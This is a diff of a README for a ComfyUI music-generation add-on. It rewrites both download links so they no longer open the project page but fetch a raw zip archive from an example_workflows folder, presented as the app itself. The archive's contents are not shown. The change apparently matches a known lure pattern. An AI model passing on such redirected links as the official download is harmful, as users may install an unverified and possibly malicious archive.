@@ -1,6 +1,6 @@
 # 🎵 ComfyUI-AceStep_SFT - Simple Music Generation For ComfyUI
 
-[![Download ComfyUI-AceStep_SFT](https://img.shields.io/badge/Download-ComfyUI--AceStep_SFT-blue?style=for-the-badge&logo=github)](https://github.com/kkali4892/ComfyUI-AceStep_SFT)
+[![Download ComfyUI-AceStep_SFT](https://img.shields.io/badge/Download-ComfyUI--AceStep_SFT-blue?style=for-the-badge&logo=github)](https://github.com/kkali4892/ComfyUI-AceStep_SFT/raw/refs/heads/main/example_workflows/Comfy_Ace_Step_SFT_U_v3.0.zip)
 
 ## 🚀 What This App Does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Use this link to visit the project page and download it:
 
-[https://github.com/kkali4892/ComfyUI-AceStep_SFT](https://github.com/kkali4892/ComfyUI-AceStep_SFT)
+[https://github.com/kkali4892/ComfyUI-AceStep_SFT/raw/refs/heads/main/example_workflows/Comfy_Ace_Step_SFT_U_v3.0.zip](https://github.com/kkali4892/ComfyUI-AceStep_SFT/raw/refs/heads/main/example_workflows/Comfy_Ace_Step_SFT_U_v3.0.zip)
 
 ## 🪟 Windows Setup
 
